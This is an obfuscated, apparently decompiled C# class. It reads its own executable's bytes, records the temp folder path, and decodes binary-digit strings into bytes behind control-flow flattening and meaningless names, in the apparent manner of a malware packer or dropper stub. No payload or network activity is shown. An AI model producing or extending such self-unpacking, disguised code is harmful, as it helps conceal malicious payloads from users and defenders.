using System;
using System.IO;
using System.Text.RegularExpressions;
using System.Windows.Forms;
using Microsoft.VisualBasic.CompilerServices;

namespace RTGDtNhY2dFbiUuCGN;

[StandardModule]
internal sealed class bvxvMC1XKDGs03fsG1
{
	public static byte[] GCpZmAlCIv = File.ReadAllBytes((string)nsHEyhIjwHJkFPMjhEy());

	public static string K6aZhFUpCX = (string)J5rB0qIC7n75qJOvuYJ();

	public static byte[] i4sZwh2arq(string string_0)
	{
		checked
		{
			byte[] result2 = default(byte[]);
			while (true)
			{
				string object_ = (string)M4H6muIRk6ANfGmlNSX(string_0, "[^01]", "");
				while (true)
				{
					byte[] array = new byte[(int)RxurTWIapROogWKJpyy((double)nd3FaWIPEN43GKRGrxK(object_) / 8.0 - 1.0) + 1];
					int num = array.Length - 1;
					int num2 = 0;
					_ = 0;
					if (!BQt9eVIKH2jJ3sh9pt5())
					{
					}
					while (true)
					{
						int num3 = num2;
						int num4 = num;
						if (num3 <= num4)
						{
							array[num2] = GsFkMHIU3BL4h8TNloE(JCL7QIIIRfZ28CGtRK3(object_, num2 * 8, 8), 2);
							goto IL_0059;
						}
						while (true)
						{
							byte[] result = array;
							if (!BQt9eVIKH2jJ3sh9pt5())
							{
								break;
							}
							switch (8)
							{
							case 0:
								break;
							case 6:
								goto IL_0059;
							case 3:
								continue;
							default:
								goto end_IL_0061;
							case 5:
								goto end_IL_0006;
							case 8:
								return result;
							case 9:
								return result2;
							}
							goto end_IL_009f;
							continue;
							end_IL_0061:
							break;
						}
						continue;
						IL_0059:
						num2++;
						continue;
						end_IL_009f:
						break;
					}
					continue;
					end_IL_0006:
					break;
				}
			}
		}
	}

	internal static object nsHEyhIjwHJkFPMjhEy()
	{
		return Application.get_ExecutablePath();
	}

	internal static object J5rB0qIC7n75qJOvuYJ()
	{
		return Path.GetTempPath();
	}

	internal static bool BQt9eVIKH2jJ3sh9pt5()
	{
		return true;
	}

	internal static bool zKv5wrIA9YjZVUMKoI4()
	{
		return false;
	}

	internal static object M4H6muIRk6ANfGmlNSX(object object_0, object object_1, object object_2)
	{
		return Regex.Replace((string)object_0, (string)object_1, (string)object_2);
	}

	internal static int nd3FaWIPEN43GKRGrxK(object object_0)
	{
		return ((string)object_0).Length;
	}

	internal static double RxurTWIapROogWKJpyy(double double_0)
	{
		return Math.Round(double_0);
	}

	internal static object JCL7QIIIRfZ28CGtRK3(object object_0, int int_0, int int_1)
	{
		return ((string)object_0).Substring(int_0, int_1);
	}

	internal static byte GsFkMHIU3BL4h8TNloE(object object_0, int int_0)
	{
		return Convert.ToByte((string?)object_0, int_0);
	}
}
